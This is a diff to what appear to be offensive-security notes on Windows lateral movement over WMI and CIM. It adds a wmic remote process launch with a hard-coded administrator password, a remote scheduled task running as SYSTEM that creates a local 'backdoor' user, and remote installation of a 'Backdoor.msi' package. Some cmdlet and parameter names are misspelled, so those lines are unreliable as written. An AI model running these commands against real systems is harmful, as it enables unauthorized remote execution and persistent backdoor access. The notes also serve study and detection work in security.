@@ -28,9 +28,9 @@ Invoke-CimMethod -CimSession $session -Classname Win32_Process -MethodName creat
 	CommandLine = $command;
 } 
 ```
-### CMD
+### WMIC
 ```powershell
-# For legacy system
+# For legacy system using wmic.exe
 wmic.exe /user:administrator /password:password123 /node:<server> process call create "cmd.exe /c calc.exe"
 ```
 # Remote Service Creation
@@ -55,5 +55,33 @@ Invoke-CimMethod -InputObject $service -MethodName StartService
 Invoke-CimMethod -InputObject $service -MethodName StopService
 # Delete Service
 Invoke-CimMethod -InputObject $service -MethodName Delete
+```
+# Remote Schedule Task Creation
+- Required Group Membership: Administrators
+### Poweshell
+```powershell
+# Create command and argument
+$Command = "cmd.exe"
+$Args = "/c net user backdoor pass /add"
 
+# Create and Run schedule task
+$Action = New-ScheduleTaskAction -CimSession $session -Execute $Command -Argument $Args
+Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "backdoor"
+Start-ScheduledTask -CimSession $Session -TaskName "backdoor"
+
+Unregister-ScheduledTask -CimSession $session -TaskName "backdoor"
+```
+# Installing MSI packages
+- MSI packages can be installed using WIM using the `Win32_Product` class's static `Install` method 
+### Powershell
+```powershell
+Invoke-CimMethod -CimSession $session -Class Win32_Product -MethodName Install -Arugments @{
+	PackageLocation = "C:\Windows\Backdoor.msi";
+	Options = "";
+	AllUsers = $false;
+}
+```
+### WMIC
+```Powershell
+wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
 ```
